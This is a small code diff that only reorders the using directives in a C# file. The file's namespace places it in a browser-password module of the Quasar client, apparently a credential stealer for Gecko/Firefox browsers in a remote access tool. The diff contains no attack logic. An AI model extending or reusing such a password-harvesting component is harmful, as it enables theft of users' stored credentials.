@@ -1,13 +1,13 @@
-﻿using System;
+﻿using Quasar.Client.Helper;
+using Quasar.Client.Kematian.Browsers.Helpers.Structs;
+using Quasar.Client.Utilities;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using Quasar.Client.Utilities;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Text;
-using Quasar.Client.Kematian.Browsers.Helpers.Structs;
 using System.Runtime.Serialization;
-using Quasar.Client.Helper;
+using System.Text;
 
 namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
 {
